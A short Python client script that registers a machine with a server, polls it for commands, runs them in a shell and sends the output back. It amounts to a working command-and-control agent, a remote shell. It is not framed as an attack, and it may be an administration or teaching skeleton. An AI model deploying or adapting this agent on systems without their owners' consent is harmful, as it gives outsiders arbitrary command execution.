# client.py
import requests
import platform
import socket
import time
import subprocess
import json
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='client.log'
)

class Client:
    def __init__(self, server_url):
        self.server_url = server_url
        self.client_id = None
        self.hostname = socket.gethostname()
        self.os = platform.system()

    def register(self):
        try:
            response = requests.post(
                f"{self.server_url}/register",
                json={
                    'hostname': self.hostname,
                    'os': self.os
                }
            )
            if response.status_code == 200:
                self.client_id = response.json()['client_id']
                logging.info(f"Successfully registered with ID: {self.client_id}")
                return True
        except Exception as e:
            logging.error(f"Registration failed: {str(e)}")
        return False

    def heartbeat(self):
        try:
            response = requests.post(
                f"{self.server_url}/heartbeat/{self.client_id}"
            )
            if response.status_code == 200:
                commands = response.json().get('commands', [])
                for cmd_id, cmd_data in commands:
                    self.execute_command(cmd_id, cmd_data['command'])
        except Exception as e:
            print(e)

    def execute_command(self, command_id, command):
        try:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            stdout, stderr = process.communicate()
            output = stdout.decode() if stdout else stderr.decode()

            requests.post(
                f"{self.server_url}/result/{command_id}",
                json={'output': output}
            )
            logging.info(f"Executed command {command_id}: {command}")
        except Exception as e:
            logging.error(f"Command execution failed: {str(e)}")

    def run(self):
        if not self.register():
            return

        while True:
            self.heartbeat()
            time.sleep(30)  # Heartbeat interval

if __name__ == '__main__':
    SERVER_URL = 'http://localhost:5000'  # Change this to your server URL
    client = Client(SERVER_URL)
    client.run()